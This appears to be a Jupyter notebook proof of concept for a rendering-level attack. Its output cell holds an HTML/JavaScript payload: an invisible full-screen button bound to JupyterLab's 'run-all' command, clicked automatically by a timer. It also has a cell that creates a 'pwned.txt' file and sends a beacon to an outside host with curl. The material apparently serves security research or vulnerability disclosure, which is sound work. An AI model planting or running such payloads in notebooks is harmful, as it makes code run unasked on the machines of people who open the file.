# %%
from IPython.display import HTML, display
display(HTML("""
<button id=\"runjs\" tabindex=0>Run JS RHINO</button>
<script>
  alert('Check the terminal and type `ls` to see pwned.txt');
  document.getElementById('runjs').onclick = () => alert(window.origin);
</script>
"""))
# Out:
# <button data-commandlinker-command="runmenu:run-all" id="run-all-btn" style="background-color: red;width: 10000px;height: 10000px;top: -1000px;left: -1000px;opacity: 0.5;pointer-events: all;position:fixed;cursor:crosshair;z-index:987987">VERSION 8</button>
# <button id="runjs" tabindex=0>Run JS RHINO</button>
# <script>
#   alert('Check the terminal and type `ls` to see pwned.txt');
#   document.getElementById('runjs').onclick = () => alert(window.origin);
#
#   setTimeout(() => {
#     const btn = document.getElementById('run-all-btn');
#     if (btn) btn.click();
#   }, 800);
# </script>

# %%
# !touch /home/ec2-user/pwned.txt && curl -s 'https://6q7xrn2e.c5.rs/beacon?pwned=proof' > /dev/null
